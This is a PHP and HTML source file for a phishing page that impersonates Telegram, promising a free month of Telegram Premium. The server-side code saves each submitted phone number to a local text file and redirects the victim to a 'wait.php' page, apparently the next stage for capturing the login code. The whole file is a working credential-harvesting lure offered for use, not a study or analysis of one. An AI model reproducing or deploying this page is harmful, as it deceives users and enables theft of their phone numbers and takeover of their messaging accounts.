<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['full_phone'] ?? '';
    $data = "Phone: " . $phone . "\n\n";
    file_put_contents("user.txt", $data, FILE_APPEND);
    header("Location: wait.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Premium Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css"/>
  <style>
    body {
      background-color: #0d1a26;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      color: #ffffff;
    }

    .login-box {
      width: 360px;
      padding: 40px;
      background-color: #11202e;
      border-radius: 20px;
      position: relative;
      box-shadow: 0 0 20px rgba(0, 136, 204, 0.2);
      text-align: center;
    }

    .login-box::before {
      content: "";
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      z-index: -1;
      background: linear-gradient(45deg, #0088cc, #6f42c1, #00c3ff);
      border-radius: 22px;
      background-size: 300% 300%;
      animation: borderRGB 6s ease infinite;
    }

    @keyframes borderRGB {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .login-box img {
      width: 100px;
      height: 100px;
      object-fit: cover;
      border-radius: 50%;
      display: block;
      margin: 0 auto 20px auto;
      border: 2px solid #00c3ff;
    }

    .login-box h2 {
      margin-bottom: 15px;
      font-size: 22px;
      color: #00c3ff;
    }

    .login-box p {
      font-size: 14px;
      color: #b0c7d6;
      margin-bottom: 20px;
    }

    .login-box input[type="tel"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 20px;
      border: 1px solid #2d3e50;
      border-radius: 8px;
      font-size: 14px;
      background-color: #1b2a38;
      color: #fff;
    }

    .login-box .iti {
      width: 100%;
      margin-bottom: 20px;
    }

    .login-box button {
      background: linear-gradient(90deg, #0088cc, #6f42c1, #00c3ff);
      background-size: 300% 300%;
      animation: borderRGB 6s ease infinite;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background-position 0.4s;
    }

    .login-box button:hover {
      background-position: 100% 0;
    }

    .login-box a.forgot {
      display: block;
      margin-top: 16px;
      font-size: 13px;
      color: #70b9d4;
      text-decoration: none;
    }

    .login-box a.forgot:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <form method="POST" class="login-box" id="loginForm">
    <img src="img/TelegramPremium336.jpg" alt="Telegram Premium Logo">
    <h2>Telegram Premium</h2>
    <p>To activate your free 1-month Premium plan, please enter your phone number.</p>

    <input type="tel" id="phone" name="phone" required>
    <input type="hidden" name="full_phone" id="full_phone"> <!-- برای ارسال شماره کامل -->

    <button type="submit">Login</button>
  </form>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
  <script>
    const input = document.querySelector("#phone");
    const form = document.querySelector("#loginForm");
    const fullPhoneInput = document.querySelector("#full_phone");

    const iti = window.intlTelInput(input, {
      preferredCountries: ["ir", "us", "gb"],
      separateDialCode: true,
      nationalMode: true, // فقط شماره ملی
      initialCountry: "auto",
      geoIpLookup: function(callback) {
        fetch("https://ipapi.co/json")
          .then(response => response.json())
          .then(data => callback(data.country_code))
          .catch(() => callback("us"));
      },
      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    form.addEventListener("submit", function(e) {
      const countryCode = "+" + iti.getSelectedCountryData().dialCode;
      const nationalNumber = input.value.replace(/\D/g, '').replace(/^0+/, '');
      const fullNumber = `${countryCode} ${nationalNumber}`;
      fullPhoneInput.value = fullNumber;
    });
  </script>

</body>
</html>
